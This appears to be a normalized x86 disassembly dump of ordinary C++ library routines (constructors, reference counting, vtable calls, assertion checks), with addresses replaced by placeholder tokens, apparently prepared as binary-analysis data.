cmp [ ebp - 0x19 ] al
push 0x107
push r--data
push r--data
setle al
push r--data
movzx eax al
push 0x8
push eax
call sub_403978
add esp 0x18
cmp [ ebp - 0x34 ] 0x0
je r-xdata
push [ ebp - 0x34 ]
mov eax [ ebp - 0x24 ]
push [ ebp - 0x19 ]
mov ecx [ ebp - 0x20 ]
mov [ ebx ] edi
call sub_415c8f
mov eax [ ebx ]
movzx ecx [ eax ]
push [ ebp - 0x34 ]
inc eax
mov [ ebx ] eax
mov eax [ ebp - 0x24 ]
push ecx
mov ecx [ ebp - 0x20 ]
call sub_415c8f
jmp r-xdata
cmp eax 0xa
jle r-xdata
mov eax [ ebx ]
mov cl [ eax ]
inc eax
mov [ ebx ] eax
movzx eax cl
mov ax [ esi + eax * 2 ]
and ax di
xor ecx ecx
cmp cx ax
setne al
movzx eax al
push eax
lea eax [ ebp - 0xc ]
jmp r-xdata
push 0x14e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov [ ebp - 0x19 ] 0x8
jmp r-xdata
cmp esi 0xc
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
cmp [ esi + 0x20 ] 0x0
sete al
mov [ esi + 0x20 ] al
push [ ebp - 0x14 ]
jmp r-xdata
mov bl [ ebp - 0x14 ]
jmp r-xdata
mov [ ebx ] esi
cmp eax 0xb
jne r-xdata
mov ecx [ ebp - 0x20 ]
call sub_415ce4
jmp r-xdata
mov eax [ ebx ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x30 ]
call sub_418b46
mov esi [ ebp - 0x28 ]
cmp eax 0x9
sete [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
je r-xdata
cmp esi 0xd
je r-xdata
push [ ebp - 0x20 ]
mov al [ ebp - 0x19 ]
call sub_418dbe
jmp r-xdata
cmp [ ebp - 0x19 ] 0x8
push 0x100
push r--data
push r--data
setle al
push r--data
movzx eax al
push 0x8
push eax
call sub_403978
add esp 0x18
cmp [ ebp - 0x34 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
push ebx
call sub_418b46
test eax eax
je r-xdata
mov [ ebp - 0x38 ] esi
mov [ ebx ] esi
jmp r-xdata
push 0x8
jmp r-xdata
mov bl 0x8
inc [ ebx ]
mov esi [ ebx ]
cmp esi [ ebp - 0x30 ]
push 0x135
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x4
push eax
call sub_403978
add esp 0x18
cmp eax 0xd
jne r-xdata
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x24 ]
mov edx esi
call sub_4185eb
movzx eax ax
push 0x13a
push r--data
xor ecx ecx
cmp cx ax
mov [ ebp - 0x38 ] eax
push r--data
setne al
push r--data
movzx eax al
push 0x1
push eax
call sub_403978
add esp 0x18
push [ ebp - 0x40 ]
lea eax [ ebp - 0x38 ]
sub_4158ab
push 0x4c
mov eax sub_44d1b5
call sub_4485fe
mov eax [ ebp + 0xc ]
and [ ebp - 0x58 ] 0x0
mov esi ecx
shr eax 0x1
push 0x8
and al 0x1
pop ecx
mov [ ebp - 0x50 ] esi
mov ebx edx
mov [ ebp - 0x49 ] al
test [ ebp + 0xc ] ecx
je r-xdata
mov ecx ebx
call sub_419df2
test al al
jne r-xdata
push [ ebp + 0x8 ]
mov esi ebx
lea edi [ ebp - 0x30 ]
[ edi ] [ esi ]
test al al
mov esi ebx
lea eax [ ebp - 0x30 ]
je r-xdata
mov eax ebx
lea ebx [ ebp - 0x48 ]
call sub_416f3f
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jne r-xdata
call sub_418c2a
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x50 ]
call sub_418d34
add esp 0xc
jmp r-xdata
call sub_418c2a
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x50 ]
call sub_418ccd
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x4 ] 0x2
push [ ebp - 0x50 ]
call sub_418e5a
mov [ ebp - 0x58 ] 0x1
xor esi esi
mov eax ebx
inc esi
push eax
mov [ ebp - 0x4 ] esi
push [ ebp - 0x50 ]
call sub_418de6
mov [ ebp - 0x58 ] esi
jmp r-xdata
xor eax eax
cmp ax [ ebx + 0x22 ]
jne r-xdata
mov eax [ ebp - 0x50 ]
pop ecx
pop ecx
lea esi [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x0
call sub_41472b
mov al [ ebx + 0x20 ]
mov bx [ ebx + 0x22 ]
mov [ ebp - 0x54 ] al
xor eax eax
mov [ ebp - 0x52 ] bx
cmp ax bx
jne r-xdata
push 0xf6
push r--data
push r--data
call sub_4258e2
add esp 0xc
lea eax [ ebp - 0x54 ]
push eax
push esi
call sub_41518e
pop ecx
pop ecx
mov eax esi
jmp r-xdata
push 0x28
push r--data
push r--data
call sub_4258e2
add esp 0xc
call sub_448681
retn
sub_415a28
push ebp
mov ebp esp
push esi
push edi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
push [ ebp + 0x14 ]
mov eax esi
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
call sub_41b711
add esi 0x4
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
pop ebp
retn
sub_415a8e
push ebp
mov ebp esp
push esi
mov esi eax
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x4 ]
test al al
jne r-xdata
xor eax eax
inc eax
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_418f16
test al al
jne r-xdata
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_415ac5
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi eax
mov eax [ esi + 0x4 ]
call sub_418f16
test al al
jne r-xdata
xor eax eax
inc eax
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x4 ]
test al al
jne r-xdata
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_415b48
mov edx [ eax ]
cmp edx [ eax + 0xc ]
jne r-xdata
xor eax eax
retn
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
test al al
je r-xdata
xor eax eax
inc eax
retn
sub_415b72
mov edx [ eax ]
cmp edx [ eax + 0x10 ]
jne r-xdata
xor eax eax
retn
mov [ eax + 0x1d ] 0x1
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
test al al
je r-xdata
xor eax eax
inc eax
retn
sub_415ba0
push ebp
mov ebp esp
push ecx
movzx edx [ r--data ]
push ebx
push edi
mov ebx eax
mov ecx [ ebx + 0x204 ]
xor eax eax
mov [ ebp - 0x4 ] 0x0
lea edi [ ebp - 0x3 ]
stosb [ edi ]
mov eax [ ecx ]
push edx
call [ eax + 0x18 ]
mov [ ebp - 0x4 ] al
lea eax [ ebp - 0x3 ]
push eax
lea ecx [ ebp - 0x4 ]
call sub_40655a
pop edi
pop ebx
leave
retn
sub_415c8f
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
je r-xdata
movzx ecx [ ebp + 0x8 ]
mov ecx [ eax + 0x204 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx ecx al
jmp r-xdata
call sub_419dc1
pop edi
pop ebp
retn 0x8
sub_415cbc
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
push ebx
mov ebx ecx
je r-xdata
push ebx
push [ ebp + 0x8 ]
call sub_418dbe
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_418f83
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_415d11
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
lea esi [ edi + 0x8 ]
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
and [ edi + 0x4 ] 0x0
mov [ edi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ edi + 0x28 ] eax
pop esi
test eax eax
je r-xdata
mov eax edi
pop ebp
retn 0x4
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_415d53
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x28 ]
call sub_407804
mov esi [ ebp + 0x8 ]
push eax
lea ebx [ edi + 0x8 ]
call sub_418fb8
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_415d8b
push ebp
mov ebp esp
push edi
test ecx ecx
je r-xdata
xor edi edi
lea edi [ ecx + 0x8 ]
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_41901c
pop edi
pop ebp
retn 0x4
sub_415deb
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
lea esi [ edi + 0x8 ]
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
and [ edi + 0x4 ] 0x0
mov [ edi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ edi + 0x28 ] eax
pop esi
test eax eax
je r-xdata
mov eax edi
pop ebp
retn 0x4
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_415e2d
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x28 ]
call sub_407804
mov esi [ ebp + 0x8 ]
push eax
lea edx [ edi + 0x8 ]
call sub_419068
pop edi
pop esi
pop ebp
retn 0x4
sub_415e63
push ebp
mov ebp esp
push edi
test ecx ecx
je r-xdata
xor edi edi
lea edi [ ecx + 0x8 ]
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_4190b3
pop edi
pop ebp
retn 0x4
sub_415ec3
mov al [ eax ]
mov [ esi + 0x8 ] al
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_415eed
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov esi [ ebp + 0x8 ]
add edi 0x8
mov ecx eax
call sub_4190ff
pop edi
pop esi
pop ebp
retn 0x4
sub_415f77
mov eax [ eax ]
mov [ esi + 0x8 ] eax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_415fa1
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
lea ecx [ edi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov ebx eax
mov eax ecx
call sub_419139
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41602f
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4160d4
mov eax [ eax ]
mov [ esi + 0x8 ] eax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4160fe
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
push eax
mov eax [ ebp + 0x8 ]
lea esi [ edi + 0x8 ]
call sub_4191bc
pop edi
pop esi
pop ebp
retn 0x4
sub_416134
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
lea esi [ ecx + 0xc ]
mov [ edi + 0x11 ] 0x1
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0xc ]
pop edi
pop esi
pop ebp
retn 0x4
sub_416194
mov eax [ eax ]
mov [ esi + 0x8 ] eax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4161be
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
push eax
mov eax [ ebp + 0x8 ]
lea esi [ edi + 0x8 ]
call sub_41921d
pop edi
pop esi
pop ebp
retn 0x4
sub_416243
mov ax [ eax ]
mov [ esi + 0x8 ] ax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41626f
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov esi [ ebp + 0x8 ]
lea ecx [ edi + 0x8 ]
mov edi eax
call sub_419287
pop edi
pop esi
pop ebp
retn 0x4
sub_4162f5
mov ax [ eax ]
mov [ esi + 0x8 ] ax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_416321
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov esi [ ebp + 0x8 ]
lea ecx [ edi + 0x8 ]
mov edi eax
call sub_41931b
pop edi
pop esi
pop ebp
retn 0x4
sub_4163a7
mov ax [ eax ]
mov [ esi + 0x8 ] ax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4163d3
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov esi [ ebp + 0x8 ]
lea ecx [ edi + 0x8 ]
mov edi eax
call sub_4193af
pop edi
pop esi
pop ebp
retn 0x4
sub_416459
mov ax [ eax ]
mov [ esi + 0x8 ] ax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_416485
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov esi [ ebp + 0x8 ]
lea ecx [ edi + 0x8 ]
mov edi eax
call sub_419443
pop edi
pop esi
pop ebp
retn 0x4
sub_41651e
mov eax [ eax ]
mov [ esi + 0x8 ] eax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_416548
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov esi [ ebp + 0x8 ]
push eax
lea eax [ edi + 0x8 ]
call sub_4194d7
pop edi
pop esi
pop ebp
retn 0x4
sub_416569
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
lea esi [ ecx + 0xc ]
mov [ edi + 0x20 ] 0x1
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x8 ]
pop edi
pop esi
pop ebp
retn 0x4
sub_4165da
mov eax [ eax ]
mov [ esi + 0x8 ] eax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_416604
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov esi [ ebp + 0x8 ]
push eax
lea eax [ edi + 0x8 ]
call sub_419594
pop edi
pop esi
pop ebp
retn 0x4
sub_416625
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
lea esi [ ecx + 0xc ]
mov [ edi + 0x20 ] 0x1
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x8 ]
pop edi
pop esi
pop ebp
retn 0x4
sub_416696
mov al [ eax ]
mov [ esi + 0x8 ] al
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4166c0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov esi [ ebp + 0x8 ]
add edi 0x8
push edi
mov edi eax
call sub_41961b
pop edi
pop esi
pop ebp
retn 0x4
sub_4166f8
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
push eax
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_419664
pop ebp
retn 0x4
sub_416759
mov al [ eax ]
mov [ esi + 0x8 ] al
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_416783
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov esi [ ebp + 0x8 ]
add edi 0x8
mov ecx eax
call sub_419688
pop edi
pop esi
pop ebp
retn 0x4
sub_4167ba
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
push eax
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_4196b1
pop ebp
retn 0x4
sub_41681b
mov eax [ eax ]
mov [ esi + 0x8 ] eax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_416845
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov esi [ ebp + 0x8 ]
lea edx [ edi + 0x8 ]
mov edi eax
call sub_4196d5
pop edi
pop esi
pop ebp
retn 0x4
sub_41687c
push ebp
mov ebp esp
push edi
test ecx ecx
je r-xdata
xor edi edi
lea edi [ ecx + 0x8 ]
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_419717
pop edi
pop ebp
retn 0x4
sub_4168de
push edi
mov ecx ebx
lea eax [ esi + 0x8 ]
call sub_40fda8
mov eax [ ebx + 0x8 ]
mov [ esi + 0x10 ] eax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x14 ] eax
pop edi
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_416915
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
call sub_407804
push eax
push [ ebp + 0x8 ]
lea eax [ edi + 0x8 ]
call sub_41973b
pop edi
pop esi
pop ebp
retn 0x4
sub_41699a
lea eax [ esi + 0x8 ]
call sub_416e9c
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x10 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4169c7
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x10 ]
call sub_407804
push eax
push [ ebp + 0x8 ]
lea ecx [ edi + 0x8 ]
call sub_4197c7
pop edi
pop esi
pop ebp
retn 0x4
sub_4169e8
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
test edi edi
je r-xdata
xor esi esi
lea esi [ edi + 0x8 ]
jmp r-xdata
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
lea esi [ edi + 0x10 ]
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_416a6a
lea eax [ esi + 0x8 ]
call sub_416edd
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x14 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_416a97
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
call sub_407804
push eax
push [ ebp + 0x8 ]
lea ecx [ edi + 0x8 ]
call sub_41981d
pop edi
pop esi
pop ebp
retn 0x4
sub_416ab8
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
test edi edi
je r-xdata
xor esi esi
lea esi [ edi + 0x8 ]
jmp r-xdata
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
lea esi [ edi + 0x14 ]
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_416b3a
lea eax [ esi + 0x8 ]
call sub_416f24
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x10 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_416b67
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x10 ]
call sub_407804
push eax
push [ ebp + 0x8 ]
lea eax [ edi + 0x8 ]
call sub_41986e
pop edi
pop esi
pop ebp
retn 0x4
sub_416b88
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
test edi edi
je r-xdata
xor esi esi
lea esi [ edi + 0x8 ]
jmp r-xdata
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
lea esi [ edi + 0x10 ]
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_416bbb
push ebp
mov ebp esp
push esi
test ecx ecx
je r-xdata
xor esi esi
lea esi [ ecx + 0x8 ]
jmp r-xdata
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0xc ]
sub_416c4a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_416f6f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416c6a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_416fb2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416c8a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_416ff5
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416caa
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_417025
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416cca
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_417055
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416cea
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_417085
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416d0a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_4170b5
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416d2a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_4170e5
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416d4a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_417115
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416d6a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_417145
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416d8a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_417175
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416daa
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_4171a5
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416dca
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_4171d5
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416dea
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_417205
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416e0a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_417235
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416e2a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_417265
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416e4a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_417295
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416e7c
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_4172d4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416e9c
mov ecx [ edx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
mov cl [ edx + 0x4 ]
mov [ eax + 0x4 ] cl
mov cl [ edx + 0x5 ]
mov [ eax + 0x5 ] cl
retn
push esi
xor esi esi
add ecx 0x4
inc esi
[ ecx ] esi
pop esi
sub_416ebd
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41731a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416edd
mov ecx [ edx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
mov cl [ edx + 0x4 ]
mov [ eax + 0x4 ] cl
mov cl [ edx + 0x5 ]
mov [ eax + 0x5 ] cl
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
retn
push esi
xor esi esi
add ecx 0x4
inc esi
[ ecx ] esi
pop esi
sub_416f04
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_417360
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_416f24
mov ecx [ edx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
mov cl [ edx + 0x4 ]
mov [ eax + 0x4 ] cl
retn
push esi
xor esi esi
add ecx 0x4
inc esi
[ ecx ] esi
pop esi
sub_416f3f
push esi
push edi
push 0x8
pop ecx
mov esi eax
mov edi ebx
[ edi ] [ esi ]
mov cl [ eax + 0x20 ]
mov [ ebx + 0x20 ] cl
mov cl [ eax + 0x21 ]
mov [ ebx + 0x21 ] cl
mov cx [ eax + 0x22 ]
mov [ ebx + 0x22 ] cx
lea ecx [ eax + 0x24 ]
lea eax [ ebx + 0x24 ]
push eax
call sub_4173e4
pop edi
mov eax ebx
pop esi
retn
sub_416f6f
push 0x0
mov eax sub_44bdf1
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ edi + 0x8 ]
mov [ edi ] r--data
call sub_40487c
call sub_44866d
retn 0x4
